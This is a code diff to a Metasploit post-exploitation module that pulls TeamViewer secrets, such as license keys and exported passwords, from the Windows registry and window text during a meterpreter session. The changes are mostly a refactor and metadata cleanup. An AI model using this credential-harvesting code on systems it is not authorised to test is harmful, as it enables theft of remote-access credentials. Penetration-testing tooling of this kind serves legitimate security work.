@@ -22,7 +22,23 @@ class MetasploitModule < Msf::Post
         ],
         'Author' => [ 'Nic Losby <blurbdust[at]gmail.com>', 'Kali-Team <kali-team[at]qq.com>'],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_railgun_api
+              stdapi_railgun_api_multi
+              stdapi_railgun_memread
+              stdapi_railgun_memwrite
+              stdapi_sys_process_get_processes
+            ]
+          }
+        }
       )
     )
     register_options(
@@ -35,18 +51,18 @@ class MetasploitModule < Msf::Post
   def app_list
     results = ''
     keys = [
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\TeamViewer\\Temp', 'SecurityPasswordExported' ],
-      [ 'HKLM\\SOFTWARE\\TeamViewer', 'Version' ],
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer',
+      'HKLM\\SOFTWARE\\TeamViewer\\Temp',
+      'HKLM\\SOFTWARE\\TeamViewer',
     ]
 
     locations = [
@@ -58,7 +74,7 @@ class MetasploitModule < Msf::Post
       { value: 'LicenseKeyAES', description: 'Perpetual License Key' }, # for <= v14
     ]
 
-    keys.each do |parent_key, _child_key|
+    keys.each do |parent_key|
       locations.each do |location|
         secret = registry_getvaldata(parent_key, location[:value])
         next if secret.nil?
@@ -124,9 +140,7 @@ class MetasploitModule < Msf::Post
       addr = session.railgun.util.alloc_and_write_wstring('Kali-Team')
       client.railgun.user32.SendMessageW(window_hwnd, 'WM_GETTEXT', 1024, addr)
       text = session.railgun.util.read_wstring(addr)
-      client.railgun.multi([
-        ['kernel32', 'VirtualFree', [addr, 0, MEM_RELEASE]],
-      ])
+      session.railgun.util.free_data(addr)
       if text.strip == ''
         return nil
       else
